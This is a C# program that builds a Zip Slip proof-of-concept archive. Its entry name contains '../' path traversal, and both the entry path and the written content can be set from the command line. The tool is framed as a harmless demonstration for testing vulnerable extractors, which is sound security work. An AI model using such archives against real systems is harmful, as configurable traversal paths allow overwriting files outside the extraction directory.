using System.IO.Compression;
using System.Text;

const string defaultEntryName = "../zip-slip-dotnet-proof.txt";
const string defaultMarker = "ZIP_SLIP_DOTNET_PROOF_OF_CONCEPT";
var outputPath = Path.Combine(Directory.GetCurrentDirectory(), "exploit.zip");
var entryName = defaultEntryName;
var marker = defaultMarker;

for (var index = 0; index < args.Length; index++)
{
    switch (args[index])
    {
        case "--output":
            outputPath = ReadValue(args, ref index, "--output");
            break;
        case "--entry-name":
            entryName = ReadValue(args, ref index, "--entry-name");
            break;
        case "--marker":
            marker = ReadValue(args, ref index, "--marker");
            break;
        case "--help" or "-h":
            PrintUsage();
            return;
        default:
            throw new ArgumentException($"Unknown option '{args[index]}'.");
    }
}

if (!entryName.Contains("..", StringComparison.Ordinal))
    throw new ArgumentException("The entry name must contain '..' so the archive demonstrates path traversal.");

var outputDirectory = Path.GetDirectoryName(Path.GetFullPath(outputPath));
if (!string.IsNullOrEmpty(outputDirectory))
    Directory.CreateDirectory(outputDirectory);

using (var archive = ZipFile.Open(outputPath, ZipArchiveMode.Create))
{
    var entry = archive.CreateEntry(entryName, CompressionLevel.Fastest);
    await using var writer = new StreamWriter(entry.Open(), new UTF8Encoding(false));
    await writer.WriteAsync($"{marker}{Environment.NewLine}");
}

Console.WriteLine($"[OK] Exported payload to {Path.GetFullPath(outputPath)}");
Console.WriteLine($"[OK] Archive entry: {entryName}");

static string ReadValue(string[] arguments, ref int index, string option)
{
    if (++index >= arguments.Length || string.IsNullOrWhiteSpace(arguments[index]))
        throw new ArgumentException($"Option {option} requires a value.");

    return arguments[index];
}

static void PrintUsage()
{
    Console.WriteLine("""
        Create a harmless Zip Slip proof-of-concept archive.

        Usage:
          dotnet run --project PayloadBuilder -- [options]

        Options:
          --output <path>       ZIP path (default: ./exploit.zip)
          --entry-name <path>   Archive path (default: ../zip-slip-dotnet-proof.txt)
          --marker <text>       Proof text written by the vulnerable extractor
          --help                Show this help
        """);
}
